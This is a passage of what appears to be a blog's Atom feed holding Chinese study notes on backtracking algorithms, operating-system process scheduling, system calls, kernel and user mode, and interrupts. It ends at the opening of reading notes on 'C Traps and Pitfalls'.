&#123;</div><div class="line">15:               a[i]下一个可能的值；</div><div class="line">16:           &#125;</div><div class="line">17:           if(a[i]在搜索空间内)</div><div class="line">18:          &#123;</div><div class="line">19:               标识占用的资源；</div><div class="line">20:               i = i+1;                              // 扩展下一个结点</div><div class="line">21:          &#125;</div><div class="line">22:          else </div><div class="line">23:         &#123;</div><div class="line">24:               清理所占的状态空间；            // 回溯</div><div class="line">25:               i = i –1; </div><div class="line">26:          &#125;</div><div class="line">27: &#125;</div></pre></td></tr></table></figure></p>
<p>递归的算法框架</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"> 1: int a[n];</div><div class="line"> 2: try(int i)</div><div class="line"> 3: &#123;</div><div class="line"> 4:     if(i&gt;n)</div><div class="line"> 5:        输出结果;</div><div class="line"> 6:      else</div><div class="line"> 7:     &#123;</div><div class="line"> 8:        for(j = 下界; j &lt;= 上界; j=j+1)  // 枚举i所有可能的路径</div><div class="line"> 9:        &#123;</div><div class="line">10:            if(fun(j))                 // 满足限界函数和约束条件</div><div class="line">11:              &#123;</div><div class="line">12:                 a[i] = j;</div><div class="line">13:               ...                         // 其他操作</div><div class="line">14:                 try(i+1);</div><div class="line">15:               回溯前的清理工作（如a[i]置空值等）;</div><div class="line">16:               &#125;</div><div class="line">17:          &#125;</div><div class="line">18:      &#125;</div><div class="line">19: &#125;</div></pre></td></tr></table></figure>
<p>DFS递归</p>
<p>回溯法的递归伪代码描述：</p>
<pre><code>void backtrack(int t)
{
    if(t &gt; n) output(x);
    else
        for (int i = f(n,t); i &lt;= g(n,t); ++i) {
            x[t] = h(i);
            if(constraint(t) &amp;&amp; bound(t)) backtrack(t+1);
        }
}
</code></pre><p>其中，</p>
<ul>
<li>参数 t 表示递归深度，即当前扩展节点在解空间树中的深度，</li>
<li>n 解空间树的高度，当 t&gt;n 时，表示已搜索到一个叶节点，</li>
<li>output(x) 打印可行解，</li>
<li>f(n,t) 和 g(n,t) 分别表示当前扩展节点处子树的起止编号，</li>
<li>h(i) 表示当前扩展节点处 x[t] 的第i个可选值，</li>
<li>constraint(t) 和 bound(t) 分别为约束函数和限界函数，用于剪枝。</li>
</ul>
<p>DFS迭代<br>回溯法的迭代伪代码描述：</p>
<pre><code>void iterative_backtrack()
{
    int t = 1;
    while (t &gt; 0) {
        if (f(n,t) &lt;= g(n,t)) {
            for (int i = f(n,t); i &lt;= g(n, t); ++i) {
                x[t] = h(i);
                if (constraint(t) &amp;&amp; bound(t)) {
                    if (solution(t)) output(x);
                    else ++t;
                }
            }
        } else {
            --t;
        }
    }
}
</code></pre><p>其中，</p>
<ul>
<li>solution(t) 判断当前扩展节点处是否已得到一个可行解。</li>
</ul>
<h3 id="常见回溯问题"><a href="#常见回溯问题" class="headerlink" title="常见回溯问题"></a>常见回溯问题</h3><h4 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h4><p>常见问题描述：<code>求字符集合的所有排列。</code></p>
<p>思路：我们以三个字符abc为例来分析一下求字符串排列的过程。首先固定第一个字符a，求后面两个字符bc的排列。当两个字符bc的排列求好之后，我们把第一个字符a和后面的b交换，得到bac，接着我们固定第一个字符b，求后面两个字符ac的排列。现在是把c放到第一位置的时候了。记住前面我们已经把原先的第一个字符a和后面的b做了交换，为了保证这次c仍然是和原先处在第一位置的a交换，我们在拿c和第一个字符交换之前，先要把b和a交换回来。在交换b和a之后，再拿c和处在第一位置的a进行交换，得到cba。我们再次固定第一个字符c，求后面两个字符b、a的排列。</p>
<h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>常见问题描述：<code>求字符集合的m种组合。</code></p>
<p>思路：字符集合可以用一个长度为n的无重复字符的字符串表示。我们从头扫描字符串的第一个字符。针对第一个字符，有两种选择：一是把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选取m-1个字符；二是不把这个字符放到组合中去，接下来我们需要在剩下的n-1个字符中选择m个字符。同样用递归的思路解决这个问题。</p>
<h4 id="子集和问题"><a href="#子集和问题" class="headerlink" title="子集和问题"></a>子集和问题</h4><p>常见子集和问题描述：<code>给定一个正整数集合A和正整数S，求A所有可能的子集A&#39;，其中A&#39;中所有元素之和等于S。</code></p>
<h4 id="8皇后问题"><a href="#8皇后问题" class="headerlink" title="8皇后问题"></a>8皇后问题</h4><p>8皇后的一个关键是确定约束函数，即如何判断某个位置是否可以放置一个皇后。</p>
<p>由于是在棋盘上，考虑利用坐标系解决：如果给这个8*8的矩阵上个坐标，横向(rows)为i = 0 to 7，纵向(columns)为j = 0 to 7。那么可以发现，在每一条斜线(/)方向上，每一个格子的横纵坐标之和(i + j)是一个固定值，从左上到右下的斜线，其值依次是0~14 (0+0; 0+1,1+0; 0+2,1+1,2+0; … ; 6+7,7+6; 7+7)；同样地，在每一条反斜线()方向上，每一个格子的横坐标与纵坐标的关系 (i + (7 - j)) 也是固定值，从右上到左下的斜线，其值依次是0~14。</p>
<p><a href="https://www.cnblogs.com/steven_oyj/archive/2010/05/22/1741376.html" target="_blank" rel="external">五大常用算法之四：回溯法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt;&lt;code&gt;回溯算法(Backtracking)&lt;/code&gt;实际上一个类似枚举的搜索尝试过程，主要是在搜索尝试过程中寻找问题的解，当发现已
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|关于cpu管理</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%85%B3%E4%BA%8Ecpu%E7%AE%A1%E7%90%86/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-关于cpu管理/</id>
    <published>2018-04-28T11:02:54.000Z</published>
    <updated>2018-04-28T04:20:50.057Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/edisonchou/p/5003694.html" target="_blank" rel="external">进程</a></p>
<h3 id="从单任务到多道任务"><a href="#从单任务到多道任务" class="headerlink" title="从单任务到多道任务"></a>从单任务到多道任务</h3><p>最开始的时候，计算机只能一个一个程序的运行，后来人们需求多了，需要在工作的同时还能听听歌、聊天…所以就发展到了多道任务的时代。同时，单一操作员单一控制终端，CPU使用率很低；多道任务也提高计算机CPU的利用率。</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p>多道任务的思想虽然表面上看是多个程序同时运行，但在计算机的内部还是一次只能执行一个任务，造成同时运行的表象是因为cpu能做到快速切换。</p>
<p>我们都知道一个任务在运行的时候，是有它自己的状态的，比如说当前的指令是什么、下一条指令在哪里…专业点讲就是寄存器、程序计数器、状态字、栈指针、优先级、进程ID、创建时间、所耗CPU时间、当前持有的各种句柄等等。当CPU进行切换的时候，为了保证下次切换回来能恢复这些状态，就要有一个数据结构能保存这些数据，这就是<code>进程控制块（Process Control Block，PCB）</code>。</p>
<p>同时为了管理的方便，也引出了<code>进程</code>的概念，作为任务的另一说法。</p>
<blockquote>
<p>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。在早期面向进程设计的计算机结构中，进程是程序的基本执行实体；在当代面向线程设计的计算机结构中，进程是线程的容器。程序是指令、数据及其组织形式的描述，进程是程序的实体。</p>
</blockquote>
<p>所以，多道任务的理解就是：</p>
<p><strong>操作系统将需要运行的程序载入到内存中，并通过某种策略进行切换、分配cpu执行权限，给用户一种多进程同时运行的假象。</strong></p>
<h4 id="多视角度解读进程"><a href="#多视角度解读进程" class="headerlink" title="多视角度解读进程"></a>多视角度解读进程</h4><p><img src="/images/操作系统-关于cpu管理01.jpg" alt="多视角度解读进程"></p>
<ul>
<li><p>物理视角：从物理内存的分配来看，每个进程占用一片内存空间，从这点上看，进程其实就是内存的某片空间。由于在任意时刻，一个CPU只能执行一条指令，因此任意时刻在CPU上执行的进程只有一个，而到底执行哪条指令是由物理程序计数器指定。因此，<strong>在物理层面，所有进程共用一个程序计数器，只是CPU在不停地做进程切换</strong>。</p>
</li>
<li><p>逻辑视角：从逻辑层面来看，每个进程都可以执行，也可以暂时挂起让别的进程执行，之后又可以接着执行。所以，进程需要想办法保持状态才能在下次接着执行时从正确的地点开始。因此，每个进程都有自己的计数器，记录其下一条指令所在的位置。（从逻辑上来说，程序计数器可以有多个）</p>
</li>
<li><p>时序视角：从时间来看，每个进程都必须往前推进。在运行一定时间后，进程都应该完成了一定的工作量。换句话说，每次进程返回，它都处在上次返回点之后。哲学家有云：“一个人不能两次踏入同一条河流”</p>
</li>
</ul>
<h3 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h3><h4 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h4><p><img src="/images/操作系统-关于CPU管理02.gif" alt="进程状态"></p>
<h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><p>既然有多个进程在内存中等待执行，就需要有一种合理的策略来安排执行的顺序。首先，一般的程序任务分为三种：CPU计算密集型、IO密集型与平衡（计算与IO各半）型，对于不同类型的程序，调度需要达到的目的也有所不同。对于IO密集型，响应时间最重要；对于CPU密集型，则周转时间最重要；而对于平衡型，进行某种响应和周转之间的平衡就显得比较重要。</p>
<p>因此，进程调度的目标就是要达到极小化平均响应时间、极大化系统吞吐率、保持系统各个功能部件均处于繁忙状态和提供某种貌似公平的机制。</p>
<h4 id="基本调度算法"><a href="#基本调度算法" class="headerlink" title="基本调度算法"></a>基本调度算法</h4><h5 id="先来先服务算法"><a href="#先来先服务算法" class="headerlink" title="先来先服务算法"></a>先来先服务算法</h5><p><img src="/images/操作系统-关于CPU管理03.jpg" alt="FCFS"></p>
<p>先来先服务（FCFS）算法是一种最常见的算法，它是人的本性中的一种公平观念。其优点就是简单且实现容易，缺点则是短的工作有可能变得很慢，因为其前面有很长的工作在执行，这样就会造成用户的交互式体验也比较差。</p>
<p>例如排队办理业务时，你要办理的业务只需要几分钟就可以办好，但是你前面的一个人办理的事情很复杂需要1个小时，这时你需要在他后面等很久，于是你就想到：要是每个人轮流办理10分钟事务的话，那该多好！于是就出现了时间片轮转算法。</p>
<h5 id="时间片轮转算法"><a href="#时间片轮转算法" class="headerlink" title="时间片轮转算法"></a>时间片轮转算法</h5><p><img src="/images/操作系统-关于cpu管理04.jpg" alt="RR"></p>
<p>时间片轮转是对FCFS算法的一种改进，其主要目的是改善短程序的响应时间，实现方式就是周期性地进行进程切换。时间片轮转的重点在于时间片的选择，需要考虑多方因素：如果运行的进程多时，时间片就需要短一些；进程数量少时，时间片就可以适当长一些。因此，时间片的选择是一个综合的考虑，权衡各方利益，进行适当折中。</p>
<p>但是，时间片轮转的系统响应时间也不一定总是比FCFS的响应时间短。时间片轮转是一种大锅饭的做法，但是现实生活中却是走的“一部分人先富，先富带动后富”的路线。例如，如果有30个任务，其中一个任务只需要1秒时间执行，而其他29个任务需要30秒钟执行，如果因为某种原因，这个只要1秒钟的任务排在另外29个任务的后面轮转，则它需要等待29秒钟才能执行（假定时间片为1秒）。于是，这个任务的响应时间和交互体验就变得非常差。因此，短任务优先算法被提出。</p>
<h5 id="短任务优先算法"><a href="#短任务优先算法" class="headerlink" title="短任务优先算法"></a>短任务优先算法</h5><p>短任务优先算法的核心是所有的任务并不都一样，而是有优先级的区分。具体来说，就是短任务的优先级比长任务的高，而我们总是安排优先级高的任务先运行。</p>
<p>短任务优先算法又分为两种类型：一种是非抢占式，一种是抢占式。非抢占式当已经在CPU上运行的任务结束或阻塞时，从候选任务中选择执行时间最短的进程来执行。而抢占式则是每增加一个新的进程就需要对所有进程（包括正在CPU上运行的进程）进行检查，谁的时间短就运行谁。</p>
<p>由于短任务优先总是运行需要执行时间最短的程序，因此其系统平均响应时间在以上几种算法中是最优的，这也是短任务优先算法的优点。但短任务优先算法也有缺点：一是可能造成长任务无法得到CPU时间从而导致“肌饿”。二是如何知道每个进程还需要运转多久？于是为了解决第一个缺点，优先级调度算法被提出。而第二个缺点则可以采取一些启发式的方法来进行估算，目前很多的人工智能算法都可以做这个事。</p>
<h5 id="优先级调度算法"><a href="#优先级调度算法" class="headerlink" title="优先级调度算法"></a>优先级调度算法</h5><p>优先级调度算法给每个进程赋予一个优先级，每次需要进程切换时，找一个优先级最高的进程进行调度。这样如果赋予长进程一个高优先级，则该进程就不会再“饥饿”。事实上，短任务优先算法本身就是一种优先级调度，只不过它给予短进程更高的优先级而已。</p>
<p>该算法的优点在于可以赋予重要的进程以高优先级以确保重要任务能够得到CPU时间，其缺点则有二：一是低优先级的进程可能会“饥饿”，二是响应时间无法保证。第一个缺点可以通过动态地调节任务的优先级解决，例如一个进程如果等待时间过长，其优先级将因持续提升而超越其他进程的优先级，从而得到CPU时间。第二个缺点可以通过将一个进程优先级设置为最高来解决，但即使将优先级设置为最高，但如果每个人都将自己的进程优先级设置为最高，其响应时间还是无法保证。</p>
<h5 id="混合调度算法"><a href="#混合调度算法" class="headerlink" title="混合调度算法"></a>混合调度算法</h5><p>之前的算法都存在一定缺点，那么可否有一个算法混合他们的优点，摒弃它们的缺点，这就是所谓的混合调度算法。混合调度算法将所有进程分为不同的大类，每个大类为一个优先级。如果两个进程处于不同的大类，则处于高优先级大类的进程优先执行；如果处于同一个大类，则采用时间片轮转算法来执行。混合调度算法的示意图如下图所示：</p>
<p><img src="/images/操作系统-关于cpu管理05.jpg" alt="混合方法"></p>
<h4 id="进程调度的过程"><a href="#进程调度的过程" class="headerlink" title="进程调度的过程"></a>进程调度的过程</h4><p><img src="/images/操作系统-关于cpu管理06.jpg" alt="调度过程"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/edisonchou/p/5003694.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;进程&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;从单任务到多道任务&quot;&gt;&lt;a href=&quot;#从单任务到多道
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|一些基本概念</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-一些基本概念/</id>
    <published>2018-04-28T10:21:30.000Z</published>
    <updated>2018-04-28T04:03:57.368Z</updated>
    
    <content type="html"><![CDATA[<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>操作系统是一个系统程序，即为别的程序提供服务的程序。那么，操作系统的服务是通过什么方式提供的呢？答案就是：<code>系统调用（System Call）</code>。</p>
<p>所谓系统调用就是：操作系统提供的API，用户通过调用这些API即可获得操作系统的服务。（想想是不是跟我们现在所作的什么Web Service、WCF、WebAPI、开放API之类的一致？）例如，如果用户程序需要进行读磁盘的操作，在C程序代码中可以使用如下语句来操作：<br><code>result = read(fd, buffer, nbytes);</code></p>
<p>这个read函数是C语言提供的库函数，而这个库函数本身则是调用的操作系统的read系统调用。具体的系统调用过程不是我们讨论的重点，但我们还是可以通过下图来看看这个read系统调用的过程。</p>
<p><img src="/images/操作系统-一些基本概念01.jpg" alt="系统调用"></p>
<p><strong>对于上图中的用户空间和内核空间是什么意思呢？</strong>请往下看。</p>
<h4 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h4><p>系统调用说白了就是一个应用程序申请操作系统的服务，既然是要调用操作系统的服务，那么是怎么从普通的应用程序切换到操作系统中运行的呢？</p>
<p>答案是 <code>int指令</code>,这是一个汇编的指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int指令</div><div class="line"></div><div class="line">格式：int n</div><div class="line"></div><div class="line">n为中断类型码，它的功能是引发中断过程。</div><div class="line"></div><div class="line">CPU执行int n指令，相当于引发一个n号中断的中断过程，执行过程如下：</div><div class="line">1）取中断类型码n；</div><div class="line">2）标志寄存器入栈，IF=0，TF=0；</div><div class="line">3）CS、IP入栈</div><div class="line">4）（IP）=（n*4），(CS)=(n*4+2)</div></pre></td></tr></table></figure>
<h3 id="内核态与用户态"><a href="#内核态与用户态" class="headerlink" title="内核态与用户态"></a>内核态与用户态</h3><blockquote>
<p>残酷的现实：世界上的人并非都是平等的，有些人生来占有的资源就多，而有的人占有的资源就很少。当有些人来了，其他人就得让出资源。程序亦是如此。</p>
</blockquote>
<p>操作系统作为计算机的管理者，享有着更多的方便或权限。为了区分不同的程序的不同权限，人们发明了内核态和用户态的概念。</p>
<h4 id="两种状态的概念"><a href="#两种状态的概念" class="headerlink" title="两种状态的概念"></a>两种状态的概念</h4><p>内核态就是拥有资源多的状态（或访问资源多的状态），也称为特权态。而用户态则是非特权态，在用户态下访问的资源会受到限制。例如，要访问OS的<code>内核数据结构</code>，如<code>进程表</code>等，则需要在特权态下才能做到。如果任意一个程序都能访问到这些数据，并有操作的能力，那整个操作系统是及其不安全、不稳定的。如果只需要访问用户程序里的数据，则在用户态下就可以了。</p>
<h4 id="两种状态的优势"><a href="#两种状态的优势" class="headerlink" title="两种状态的优势"></a>两种状态的优势</h4><ul>
<li>内核态：访问资源多，但可靠性、安全性要求高，维护管理都比较复杂；</li>
<li>用户态：访问资源有限，但可靠性、安全性要求低，维护起来比较简单；</li>
</ul>
<p>那么，一个程序到底应该运行在内核态还是用户态呢？这取决于其对资源和效率的需求；下图展示了Windows操作系统的内核态与用户态的界限，我们可以看到哪些需要在内核态下运行，哪些只在用户态下运行。</p>
<p><img src="/images/操作系统-一些基本概念02.jpg" alt="运行状态"></p>
<h4 id="两种状态的本质"><a href="#两种状态的本质" class="headerlink" title="两种状态的本质"></a>两种状态的本质</h4><p>计算机对于内核态和用户态的识别是通过CPU的一个状态位来实现的，这个状态位是CPU状态字里面的一个字位。所谓的用户态、内核态实际是CPU的一种状态，而不是程序的状态。通过设置该状态字，可以使CPU处于内核态、用户态或者其他的子态（有的CPU有更多种子态）。</p>
<p>换句话说：一个程序运行时，CPU是什么态，这个程序就运行在什么态。</p>
<p>那么，知道了是怎么实现的，那又是如何对用户态的访问进行限制的呢？在对用户态下程序执行的每一条指令进行检查，这种检查又被称为地址翻译，即对程序发出的每一条指令都要经过这个地址翻译过程（你可以将其理解为我们在实际开发中所作的权限管理，对用户发出的每个操作请求首先都经过一个Filter进行过滤），通过对翻译的控制，就可以限制程序对资源的访问。</p>
<h3 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h3><p>操作系统是为其他程序服务的，操作系统需要管理进程、内存、磁盘等，就是管理在内存中的程序，为其分配运行的空间、资源，所以操作系统要统一管理这些资源。所以说一个应用程序需要请求硬盘读写操作或申请内存空间，都需要通知操作系统，然后操作系统为其分配，这也是为什么要分用户态和内核态的原因。</p>
<p>那么用户态的程序是怎么通知操作系统的呢？答案就是<code>中断机制</code>。</p>
<p>中断是计算机里面的一个最为重要的机制，它也是操作系统获得计算机控制权的根本保证。其基本原理是：设备在完成自己的任务后向CPU发出终端，CPU判断优先级，然后确定是否响应。如果响应，则执行中断服务程序，并在中断服务程序执行完后继续执行原来的程序。下图简单地描述了中断机制：</p>
<p><img src="/images/操作系统-一些基本概念03.jpg" alt="中断机制"></p>
<p><a href="http://www.cnblogs.com/edisonchou/p/4999362.html" target="_blank" rel="external">一些基本概念</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;系统调用&quot;&gt;&lt;a href=&quot;#系统调用&quot; class=&quot;headerlink&quot; title=&quot;系统调用&quot;&gt;&lt;/a&gt;系统调用&lt;/h3&gt;&lt;p&gt;操作系统是一个系统程序，即为别的程序提供服务的程序。那么，操作系统的服务是通过什么方式提供的呢？答案就是：&lt;code&gt;系统调
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|关于操作系统</title>
    <link href="http://yoursite.com/2018/04/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%85%B3%E4%BA%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>http://yoursite.com/2018/04/28/操作系统-关于操作系统/</id>
    <published>2018-04-28T09:57:44.000Z</published>
    <updated>2018-04-28T04:07:16.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作系统是什么？"><a href="#操作系统是什么？" class="headerlink" title="操作系统是什么？"></a>操作系统是什么？</h2><h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><h4 id="操作系统到底是什么鬼？"><a href="#操作系统到底是什么鬼？" class="headerlink" title="操作系统到底是什么鬼？"></a>操作系统到底是什么鬼？</h4><p>操作系统是介于计算机和应用软件之间的一个软件系统[<strong>也是一种软件噢</strong>]，操作系统的上层和下层都有其他的对象存在：</p>
<p><img src="/images/操作系统-关于操作系统01.jpg" alt="OS"></p>
<p>从上图可以看出，OS上边是应用软件，下边是硬件平台。</p>
<h4 id="操作系统到底操控什么事？"><a href="#操作系统到底操控什么事？" class="headerlink" title="操作系统到底操控什么事？"></a>操作系统到底操控什么事？</h4><p>最原始的计算机并没有OS，直接由人来掌管事情。随着计算机复杂性的增长，人已经不能胜任直接掌控计算机了。于是，OS这个软件被编写出来帮我们掌控计算机，使人类从日益复杂的掌控任务中解脱出来。既然OS是专门掌控计算机的，那么计算机上发生的所有事情都需要OS的知晓和认可，未经OS同意的任何事情均被视为非法的（想想病毒和入侵攻击者试图做的事情）。</p>
<h3 id="两种角色"><a href="#两种角色" class="headerlink" title="两种角色"></a>两种角色</h3><ul>
<li>魔术家</li>
</ul>
<p><img src="/images/操作系统-关于操作系统02.jpg" alt="魔术家"></p>
<p>魔术家的目标是把差的东西变好，把少的东西变多，把复杂变简单。同样，OS将计算机以一个更加容易、更加方便、更加强大的方式呈现给用户。</p>
<blockquote>
<p>Example：OS通过进程抽象让每一个用户感觉有一台自己独享的CPU，通过虚拟内存抽象，让用户感觉物理内存空间具有无限扩张性，这就是把少变多的一个实例。</p>
</blockquote>
<ul>
<li>管理者</li>
</ul>
<p><img src="/images/操作系统-关于操作系统03.jpg" alt="管理者"></p>
<p>操作系统管理计算机上的软硬件资源，如CPU、内存、磁盘等，使得不同用户之间或者同一用户的不同程序之间可以安全有序地共享这些硬件资源。</p>
<p>那么，问题来了，如何让用户很好地利用这些硬件资源呢？这就是分块（Parcel Out），把硬件分块给应用程序使用。这就涉及到有效和公平的原则，这也是一个管理者的必备素质，更是设计操作系统时的不懈追求！</p>
<p>操作系统的两个角色之间既有区别又有联系，为了完成不同的任务，OS有时需要扮演魔术师，有时有需要扮演管理者，还有时需要同时扮演两个角色。</p>
<h2 id="操作系统的范畴"><a href="#操作系统的范畴" class="headerlink" title="操作系统的范畴"></a>操作系统的范畴</h2><h3 id="CPU管理"><a href="#CPU管理" class="headerlink" title="CPU管理"></a>CPU管理</h3><p>即如何分配CPU给不同应用和用户，对于进程管理坚持三个目标：一是公平（每个程序都有机会使用CPU），二是非阻塞（任何程序不能无休止地阻挠其他程序的正常推进），三是优先级（优先级高的程序开始运行则优先级低的就需要让出资源—&gt;让一部分人先富起来）。</p>
<h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><p>即如何分配内存给不同应用和用户，主要管理缓存、主存、磁盘、磁带等存储介质所形成的内存架构。其目的主要有二：一是将少变多（比如虚拟内存的使用能够使得运行程序的大小大大地增加），二是让多个程序共享同一个物理内存（这就需要对物理内存进行分割和保护，不让一个程序访问另一个程序所占的内存空间，专业术语称为运行时不能越界访问）。</p>
<h3 id="外存管理"><a href="#外存管理" class="headerlink" title="外存管理"></a>外存管理</h3><p>即如何分配外存（磁盘）给不同应用和用户，外存管理也称存储管理，也就是我们所说的文件系统，其目的是将磁盘变为一个很容易使用的存储介质以提供给用户使用。</p>
<h3 id="I-O管理"><a href="#I-O管理" class="headerlink" title="I/O管理"></a>I/O管理</h3><p>即如何分配输入输出设备给应用和用户，也称为设备管理，也就是管理输入输出设备。其目的主要有两个：一是屏蔽不同设备的差异性（用户用同样的方式访问不同的设备，从而减低编程的难度），二是提供并发访问（即将那些看上去并不具备共享特征的设备如打印机变得可以共享）。</p>
<p>操作系统的四个核心功能如下图所示：</p>
<p><img src="/images/操作系统-关于操作系统04.jpg" alt="操作系统核心功能"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>操作系统的技巧也应用于很多领域，如抽象、缓存、并发等。操作系统简单说来就是实现抽象：<code>进程抽象</code>、<code>文件抽象</code>、<code>虚拟存储抽象</code>等。而很多领域都会使用抽象，例如数据结构和程序设计（抽象数据类型？抽象类？）；很多地方也会用到缓存，例如开发Web应用程序时使用缓存降低数据库访问压力，加快页面响应速度等等。更为重要的是，对于一个程序员来说，要想知道计算机在软件层面是怎么运转的，就得学习操作系统。</p>
<h2 id="程序是如何运行的？"><a href="#程序是如何运行的？" class="headerlink" title="程序是如何运行的？"></a>程序是如何运行的？</h2><h3 id="程序运行的四大要素"><a href="#程序运行的四大要素" class="headerlink" title="程序运行的四大要素"></a>程序运行的四大要素</h3><ol>
<li><p>程序设计语言<br>首先，我们得使用一门程序设计语言进行编程，一般我们使用的都是高级程序设计语言（如C、C++、Java、C#等）。</p>
</li>
<li><p>编译系统<br>我们写好了代码，但是由于计算机不认识高级语言编写的程序，需要编译成计算机能够识别的机器语言，这就需要编译器和汇编器的帮助。</p>
</li>
<li><p>操作系统<br>机器语言程序需要加载到内存，才能形成一个运动中的程序（即进程），这就需要操作系统的帮助。</p>
<blockquote>
<p>about：进程需要在计算机芯片即CPU上执行才算是真正在执行，而将进程调度到CPU上运行也是由操作系统完成的，这里也就不难理解为什么进程管理会在我们的教科书中排在最重要的位置了。</p>
</blockquote>
</li>
<li><p>指令集结构（计算机硬件系统）<br>在CPU上执行的机器语言指令需要变成能够在一个个时钟脉冲里执行的基本操作，这就需要指令集结构和计算机硬件的支持。</p>
</li>
</ol>
<h3 id="程序运行的基本流程"><a href="#程序运行的基本流程" class="headerlink" title="程序运行的基本流程"></a>程序运行的基本流程</h3><p>基于上面提到的四大要素，我们可以得出下面一幅图，该图从一个线性角度展示了程序的演变过程，能够帮助我们理解整个程序是如何在计算机上执行的。</p>
<p><img src="/images/操作系统-关于操作系统05.jpg" alt="程序运行"></p>
<p>事实上，程序可以执行在机器语言或汇编语言上编写，用这种被称为“低级”（我更愿意称其为底层）的语言编写出来的机器语言程序无需经过编译器的翻译就可以在计算机指令集上执行。如果是在汇编语言上编写的汇编程序，则只需要经过汇编器的翻译即可加载执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;操作系统是什么？&quot;&gt;&lt;a href=&quot;#操作系统是什么？&quot; class=&quot;headerlink&quot; title=&quot;操作系统是什么？&quot;&gt;&lt;/a&gt;操作系统是什么？&lt;/h2&gt;&lt;h3 id=&quot;两个问题&quot;&gt;&lt;a href=&quot;#两个问题&quot; class=&quot;headerlink&quot; 
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>读书笔记|C陷阱与缺陷</title>
    <link href="http://yoursite.com/2018/04/24/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7/"/>
    <id>http://yoursite.com/2018/04/24/读书笔记-C陷阱与缺陷/</id>
    <published>2018-04-23T19:57:59.000Z</published>
    <updated>2018-05-01T16:20:54.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0-导读"><a href="#0-导读" class="headerlink" title="0|导读"></a>0|导读</h2><p>程序设计错误实际上反映的是程序与程序员对该程序的“心智模式”两者的相异之处。</p>
